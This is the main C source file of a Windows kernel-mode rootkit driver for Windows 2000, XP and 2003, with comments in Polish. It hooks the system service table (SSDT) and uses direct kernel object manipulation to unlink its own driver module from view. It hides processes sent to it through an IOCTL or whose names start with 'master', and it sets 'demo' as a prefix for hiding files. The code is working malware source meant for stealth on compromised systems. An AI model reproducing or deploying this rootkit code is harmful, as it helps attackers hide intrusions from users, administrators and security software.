
#include <ntddk.h>
#include "rootkit.h"
#include "rk_Tools.h"
#include "rk_DKOM.h"
#include "rk_Hook.h"

#define		FILE_DEVICE_ROOTKIT_DRIVER	FILE_DEVICE_UNKNOWN

// ten kod IOCTL wykorzystujemy do komunikacji z aplikacja
#define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_ROOTKIT_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

// lista zaladowanych modu³ów
PMODULE_ENTRY	g_ModuleListBegin;

// obiekt urzadzenia sterownika rootkita
PDEVICE_OBJECT	gp_DeviceObject = NULL;

// offsety oraz indeksy wybrane dla aktualnego systemu
NTOSKRNL_OFFSETS    offsets;
API_INDEXES         currentAPI;


// wzory, ktore wyszukujemy w operacjach ukrywania plikow , procesow
UNICODE_STRING hidePrefixW;
char *hidePrefixA;
char *rulingProcess;

// indeksy w tablicy ssdt gdzie znajduja sie uslugi, ktore chcemy przechwycic
API_INDEXES API_2K   =    { 0x20, 0x7D };
API_INDEXES API_XP   =	  { 0x25, 0x91 };
API_INDEXES API_2K3  =	  { 0x27, 0x97 }; 

// dostepne konfiguracje offsetow - te systemy sa obslugiwane przez rootkita
NTOSKRNL_OFFSETS WIN2K_OFFS		= { 0x0, 0x9C, 0xA0 };
NTOSKRNL_OFFSETS WINXP_OFFS		= { 0x0, 0x84, 0x88 };
NTOSKRNL_OFFSETS WIN2K3_OFFS	= { 0x0, 0x84, 0x88 };

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
BOOLEAN SetupOffsets(ULONG processNameOffset);

__declspec(dllimport) ULONG NtBuildNumber;

/*
*  Procedura jest callbackiem, wywolywanym przy kazdym utworzeniu badz zamknieciu procesu.
*  Rejestracja procedury odbywa sie przez wywolanie PsSetCreateProcessNotifyRoutine.
*  Przy wyladowaniu sterownika z pamieci nalezy wyrejestrowac ta procedure. W innym 
*  przypadku system pamietajacy adres tej procedury bedzie chcial ja wywolac co zakonczy
*  sie BSODem.
*/
VOID ProcessNotify(
	IN HANDLE  hParentId, 
	IN HANDLE  hProcessId, 
	IN BOOLEAN bCreate
	)
{
    PEPROCESS eproc = NULL;
    PCHAR processName = NULL;
    
    if (bCreate) {
       PsLookupProcessByProcessId( hProcessId , &eproc );
       if (eproc != NULL) {
          ULONG len = 0;
          len = strlen(rulingProcess);
  		  processName = (PCHAR) ( (ULONG)eproc + offsets.processName);
  		  if (processName!= NULL) {
    		  if (strlen(processName) >= len) {
                  if (RtlCompareMemory( processName, rulingProcess, len ) == len) {
                    DbgPrint("rootkit: Chowam proces: %ld\n",hProcessId);
                    DKOM_OnProcessHide( (ULONG)hProcessId );                     
                  }
              }
          }
       }
    }
        
    return;    
}

/*
* Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
* otwarcia urzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
* W tym przypadku ze sterownika korzysta aplikacja w user mode.
*/

NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("rootkit: OnDriverCreate\n");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );
	return status;
}

/*
* Rejestrowana przy starcie sterownika (DriverEntry) procedura wykonywana podczas 
* zamykania urzadzenia sterownika, czy to przez aplikacje trybu uzytkownika czy inny driver.
* W tym przypadku ze sterownika korzysta aplikacja w user mode.
*/

NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("rootkit: OnDriverClose\n");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );	
	return status;
}

/*
* Kolejna rejestrowana przy starcie sterownika (DriverEntry) procedura.
* Wywolywana jest podczas operacji wyladowania sterownika z systemu.
* Tutaj umieszczone sa wszystkie operacja zwalniania zasobow uzywanych przez sterownik.
* W naszym przypadku jest to m.in. usuniecie hookow z SSDT oraz wyrejestrowanie 
* callbacka ProcessNotify.
*/

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	PROOTKIT_EXT devExt;
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	UNICODE_STRING symbolicLink;

	DbgPrint("rootkit: wszedlem w OnUnload: %x \n",DriverObject);
	
	UnHookApis();

	//Delete symbolic link
	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
	IoDeleteSymbolicLink( &symbolicLink );

	IoDeleteDevice(gp_DeviceObject);

	PsSetCreateProcessNotifyRoutine( ProcessNotify  , TRUE );

    if ( hidePrefixA )
    	ExFreePool( hidePrefixA );
   	if ( rulingProcess )
    	ExFreePool( rulingProcess );
	
	DbgPrint("rootkit: opuszczam OnUnload\n");
}

/*
*  Rejestrowana podczas statru sterownika procedura obslugi pakietow IRP_MJ_DEVICE_CONTROL,
*  sluzacych do komunikacji sterownika z innymi strownikami lub aplikacja w user mode.
*  Rootkit obsluguje IRP o kodzie IOCTL_HIDE_PROCESS. W tym pakiecie sterownik otrzymuje 
*  PID procesu, ktory nalezy ukryc.
*/
NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack;
	ULONG inputSize;
	ULONG controlCode;
	PVOID pInputBuffer;

    irpStack = IoGetCurrentIrpStackLocation( Irp );
	controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	inputSize = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	pInputBuffer = Irp->AssociatedIrp.SystemBuffer;

	switch (controlCode) 
	{
	case IOCTL_HIDE_PROCESS:
		if (inputSize == sizeof(ULONG)) {
			DKOM_OnProcessHide( *(ULONG*)pInputBuffer );
		}
		break;

	default:
		break;
	}	

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp , IO_NO_INCREMENT );
	return status;
}

//----------------------------------------------------------------------------------------
//	DriverEntry
//----------------------------------------------------------------------------------------
//  Procedura startowa steronikow. Nazwa DriverEntry nie jest obowiazkowa, lecz przyjela sie 
//  jako standard.
//  Tutaj dokonujemy wszystkich ustawien sterownika, alokacji zmiennych. 
//  Utworzenia dowiazan symbolicznych za pomoca , ktorych aplikacja z trybu uzytkownika moze 
//  sie latwiej porozumiewac.
//  Ta procedura wywolana jest w kontekscie NTOSKRNL.EXE.
//  Procedura musi zwrocic STATUS_SUCCESS, w celu poprawnego zaladowania sterownika.
//----------------------------------------------------------------------------------------
NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegistryPath )
{	
	NTSTATUS		status = STATUS_SUCCESS;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	symbolicName;
	ULONG i;
	ULONG m,j,k;
	ULONG procNotifyCount;
    ULONG procNameOffset;

	DbgPrint("rootkit: Wszedlem w DriverEntry: %x\n",driverObject);
	DbgPrint("rootkit: Demo version ,please register :P\n");

	driverObject->DriverUnload  = OnUnload;

	//wypelniamy tablice
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        driverObject->MajorFunction[i] =DispatchGeneral;
    }
    
    // rejestrowanie procedur obslugi konkretnych pakietow IRP
	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = OnDriverClose;
	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl;

    // inicjalizacja nazw urzadzen do lancuchow UNICODE
    // Systemy rodziny Windows NT wewnetrznie uzywaja standardu UNICODE do operacji 
    // na lancuchach znakow
	RtlInitUnicodeString( &deviceName, ROOTKIT_DEV_NAME );
	RtlInitUnicodeString( &symbolicName, ROOTKIT_WIN32_DEV_NAME );

	//we are creating communication object that GUI can use to send requsts to driver
	// tworzymy obiekt urzadzenia sterownika, za pomoca ktorego aplikacja w user-mode moze sie 
	// komunikowac ze sterewnikiem (kernel-mode)
	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
								&deviceName,
								FILE_DEVICE_UNKNOWN,			
								0,
								TRUE,							// TRUE -> tylko jedno otwarcie tego urzadzenia naraz
								&driverObject->DeviceObject);

	if (status!=STATUS_SUCCESS) {
		DbgPrint("rootkit: IoCreateDeviceFailed\n");
		return status;
	}

	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
	if (status!=STATUS_SUCCESS) {
		DbgPrint("rootkit: IoCreateSymbolicLink failed\n");
		return status;
	}

    // alokacja zasobow z pamieci niestronnicowanej
	hidePrefixA = ExAllocatePool( NonPagedPool, 20);
	if (hidePrefixA == NULL) {
		return STATUS_UNSUCCESSFUL;
	}	
	
	// ciag ktory zawiera wzor do ukrycia, wersja ANSI
	strcpy( hidePrefixA , "demo");
	DbgPrint( "rootkit: HIDE PATTERN %s\n",hidePrefixA);

	rulingProcess = ExAllocatePool( NonPagedPool, 20);
	if (rulingProcess == NULL) {
		return STATUS_UNSUCCESSFUL;
	}	
	// proces rozpoczynajacy sie od tej nazwy bedzie widzial ukryte pliki
	strcpy( rulingProcess , "master");
	DbgPrint( "rootkit: RULING PROCESS: %s\n",rulingProcess);

	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE   
	RtlInitUnicodeString( &hidePrefixW, L"demo");

	gp_DeviceObject = driverObject->DeviceObject;

    // wykorzystanie metody zaproponowanej przez Sysinternalsow do znalezienia 
    // offsetu do nazwy procesu wzgledem poczatku struktury EPROCESS
	procNameOffset  = GetProcessNameOffset();

    // rozpoznanie oraz ustawienie offset waznych dla dzialania technik DKOM
	if ( SetupOffsets( procNameOffset ) == FALSE ) {
		DbgPrint("rootkit: System nie wspierany!");
		return STATUS_UNSUCCESSFUL;
	}

	g_ModuleListBegin =  (PMODULE_ENTRY)DKOM_GetModuleListBegin(driverObject);

	DKOM_HideRootkitModule();

	HookApis();
	
	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );

	DbgPrint("rootkit: wyjscie z DriverEntry\n");
	return status;
}

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

BOOLEAN SetupOffsets(ULONG processNameOffset)
{
	ULONG BuildNumber = (NtBuildNumber & 0x0000FFFF);

	switch (BuildNumber)
	{
	case 2195:
   		DbgPrint("rootkit: Wykryto instalacje Windows 2000\n");
		offsets    = WIN2K_OFFS;
		currentAPI = API_2K; 
		break;

	case 2600:
   		DbgPrint("rootkit: Wykryto instalacje Windows XP\n");
		offsets = WINXP_OFFS;
		currentAPI = API_XP; 		
		break;

	case 3790:		
   		DbgPrint("rootkit: Wykryto instalacje Windows 2003 Server\n");
		offsets = WIN2K3_OFFS;
		currentAPI = API_2K3; 		
		break;
	default:
		return FALSE;
		break;
	}

	offsets.processName = processNameOffset;

	return TRUE;
}
